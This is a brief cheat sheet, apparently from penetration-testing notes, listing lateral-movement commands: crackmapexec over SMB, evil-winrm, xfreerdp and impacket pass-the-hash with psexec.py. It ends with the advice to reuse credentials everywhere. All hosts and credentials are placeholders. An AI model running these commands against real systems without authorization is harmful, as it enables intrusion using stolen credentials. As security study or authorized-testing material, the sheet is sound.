# 04 – Lateral Movement

## Goal

Move between systems

---

## SMB

```bash
crackmapexec smb <IP> -u user -p pass
```

---

## WinRM

```bash
evil-winrm -i <IP> -u user -p pass
```

---

## RDP

```bash
xfreerdp /u:user /p:pass /v:<IP>
```

---

## Pass-the-Hash

```bash
psexec.py DOMAIN/user@<IP> -hashes <LM:NT>
```

---

## Golden Rule

Reuse credentials everywhere